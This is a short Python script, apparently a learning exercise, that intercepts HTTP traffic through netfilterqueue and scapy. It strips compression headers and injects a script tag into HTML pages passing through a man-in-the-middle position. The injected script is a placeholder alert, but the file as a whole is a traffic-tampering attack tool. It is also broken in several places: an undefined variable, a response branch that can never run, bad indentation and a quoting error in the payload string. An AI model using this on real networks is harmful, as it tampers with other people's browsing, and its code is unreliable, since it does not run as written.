
import netfilterqueue
import scapy.all as scapy
import re


def set_packet(packet,load):
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.TCP].len
	del scapy_packet[scapy.TCP].chksum
	return scapy_packet	
	
def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())
	#converting packet to scapy packet
	if scapy_packet.haslayer(scapy.Raw):
		load=scapy_packet[scapy.Raw].load
		if scapy_packet[scapy.TCP].dport== 80:
			print("[+] Request")	
			load=re.sub("Accept-Encoding:.*?\\r\\n","",load)		
			
			

		elif scapy_packet[scapy.TCP].dport== 80	:
			print("[+] Response")
			print(scapy_packet.show())
			code_injection="<script>alert("test");</script>"
			load=load.replace("</body>",code_injection + "</body>")
			content_len=re.search("(?:Content-Length:\S)(\d*)",load)
			if content_len 	and "text/html" in load:
			Content_len=content_len.group(1)

			new_content_len=len(code_injection) + int(Content_len) 
			load=load.replace(Content_len,str(new_content_len))
			
		if load != scapy_packet[scapy.Raw].load:
			new_packet=set_packet(scapy_packet,load)			
			packet.set_payload(str(new_packet))
	packet.accept() 
	

queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run() 



#import regix to decode the Accept Encoding of html
